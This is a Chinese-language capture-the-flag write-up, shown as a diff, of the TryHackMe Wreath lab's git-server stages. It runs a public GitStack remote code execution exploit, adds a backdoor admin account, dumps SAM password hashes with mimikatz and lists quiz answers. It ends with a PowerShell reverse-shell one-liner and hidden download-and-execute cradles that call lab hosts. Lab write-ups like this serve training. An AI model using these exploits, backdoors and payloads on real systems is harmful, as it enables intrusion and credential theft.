@@ -443,3 +443,356 @@ PORT     STATE SERVICE       REASON
 
 > http
 
+# Task 18  Git Server Pivoting
+
+用ssh做一个动态端口转发
+
+```
+sshuttle -r root@10.200.101.200 --ssh-cmd "ssh -i id_rsa" 10.200.101.0/24 -x 10.200.101.200
+```
+
+
+浏览器访问
+
+1661223640246.jpg
+
+搜索web app漏洞
+```
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# searchsploit Gitstack                                                                                      255 ⨯
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+GitStack - Remote Code Execution                                                   | php/webapps/44044.md
+GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                 | windows/remote/44356.rb
+GitStack 2.3.10 - Remote Code Execution                                            | php/webapps/43777.py
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+
+```
+
+有一个远程执行漏洞
+
+> What is the name of the program running the service?
+
+> Gitstack
+
+> Do these default credentials work (Aye/Nay)?
+
+> nay
+
+> There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?
+
+> 43777
+
+# Task 19  Git Server Code Review
+
+> Look at the information at the top of the script. On what date was this exploit written?
+
+> 18.01.2018
+
+> Bearing this in mind, is the script written in Python2 or Python3?
+
+> python2
+
+> Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?
+
+> csrftoken
+
+# Task 20  Git Server Exploitation
+
+exploit-db的脚本我这边会报错，使用github上[这个脚本](https://github.com/TBernard97/Gitstack-2.3.10-Exploit-Refactor/blob/master/exploit_refactored.py)
+
+拿到shell
+
+```
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# python3 exploit_refactored.py 10.200.101.150
+[+] Connected to http://10.200.101.150:80/ successfully.
+[*] Creating users on http://10.200.101.150:80/.
+[*] Found user twreath
+[*] Web repository already created
+[*] Getting repository list
+[*] Found repo: Website
+[*] Adding user twreath to repository
+[*] Disabling everyone user access to repository
+b'Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. '
+
+[+] The target is vulnerable and a pseudoshell has been obtained.
+Type commands to have them executed on the target.
+[*] Type 'exit' to exit.
+
+> whoami
+"nt authority\system
+" 
+
+> hostname
+"git-serv
+
+```
+
+> What is the hostname for this target?
+
+> git-serv
+
+> What operating system is this target?
+
+> Windows
+
+> What user is the server running as?
+
+> NT AUTHORITY\SYSTEM
+
+> How many make it to the waiting listener?
+
+> 0
+
+
+
+由于我们现在是system账号，并且靶机开启了3389和5985端口，可以通过添加一个添加一个用户到rdp组合administrators组，从而远程登录
+
+
+```
+
+> net user max max123456 /add
+"The command completed successfully.
+
+" 
+
+> net localgroup Administrators max /add
+"The command completed successfully.
+
+" 
+
+> net localgroup "Remote Management Users" max /add
+"The command completed successfully.
+
+
+```
+
+
+rdp登录
+```
+xfreerdp /u:max /p:'max123456' /v:10.200.101.150 +clipboard 
+```
+
+win登录
+```
+evil-winrm -u max -p max123456 -i 10.200.101.150
+```
+
+# Task 21  Git Server Stabilisation & Post Exploitation
+
+rdp进去导出哈希
+
+```
+C:\Users\max\Documents>.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+668     {0;000003e7} 1 D 20153          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;00501fb8} 3 F 6391130     GIT-SERV\max    S-1-5-21-3335744492-1614955177-2693036043-1003  (15g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 6436616     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : GIT-SERV
+SysKey : 0841f6354f4b96d21b99345d07b66571
+Local SID : S-1-5-21-3335744492-1614955177-2693036043
+
+SAMKey : f4a3c96f8149df966517ec3554632cf4
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 68b1608793104cca229de9f1dfb6fbae
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-1696O63F791Administrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
+      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
+      des_cbc_md5       (4096) : e3915234101c6b75
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WIN-1696O63F791Administrator
+    Credentials
+      des_cbc_md5       : e3915234101c6b75
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : e389f51da73551518c3c2096c0720233
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
+      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
+      des_cbc_md5       (4096) : b6f1bac2346d9e2c
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : b6f1bac2346d9e2c
+
+
+RID  : 000003e9 (1001)
+User : Thomas
+  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 03126107c740a83797806c207553cef7
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GIT-SERVThomas
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
+      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
+      des_cbc_md5       (4096) : e5add55e76751fbc
+    OldCredentials
+      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
+      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
+      des_cbc_md5       (4096) : 7f16a47cef890b3b
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GIT-SERVThomas
+    Credentials
+      des_cbc_md5       : e5add55e76751fbc
+    OldCredentials
+      des_cbc_md5       : 7f16a47cef890b3b
+
+
+RID  : 000003ea (1002)
+User : crimsonsolid
+  Hash NTLM: 3e678b266d1d449e531e92bec33b6d27
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 1ea046bff032220775c4baa7316df55e
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GIT-SERVcrimsonsolid
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 8f372574e920c61b28546de59f13a198e861f2147f68bb91a0d2e235f4cf8b3f
+      aes128_hmac       (4096) : f9889efb598feaa32b62b253745d17a8
+      des_cbc_md5       (4096) : a21f9702bc54080e
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GIT-SERVcrimsonsolid
+    Credentials
+      des_cbc_md5       : a21f9702bc54080e
+
+
+RID  : 000003eb (1003)
+User : max
+  Hash NTLM: cf4836436d2bebf810c5167ac154bdcb
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 959f2ea9834aca1bbd4ff41a5e2f0901
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GIT-SERVmax
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : f1be2fd9f46ad817398db9919a859283d93d9080abff427929f98d25432e03b6
+      aes128_hmac       (4096) : 863d45f005ac9781f52e94a5f2b2f503
+      des_cbc_md5       (4096) : dcd5b0542abc4525
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GIT-SERVmax
+    Credentials
+      des_cbc_md5       : dcd5b0542abc4525
+
+```
+
+> What is the Administrator password hash?
+
+> 37db630168e5f82aafa8461e05c6bbd1
+
+> What is the NTLM password hash for the user "Thomas"?
+
+> 02d90eda8f6b6b06c32d5f207831101f
+
+> What is Thomas' password?
+
+> i<3ruby
+
+# Task 24  Command and Control Empire: Overview
+
+> Can we get an agent back from the git server directly (Aye/Nay)?
+
+> nay
+
+# Task 27  Command and Control Empire: Agents
+
+> Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent?
+
+> shell whoami
+
+
+firewall-cmd --zone=public --add-port 8000/tcp
+
+./socat-max tcp-l:15123 tcp:10.50.102.104:80 &
+
+
+./socat-max tcp-l:8000 tcp:10.50.102.104:443
+
+
+
+powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.101.200',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.50.102.104:3389/3389'))"
+
+
+powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.200.101.200:15123/a'))"
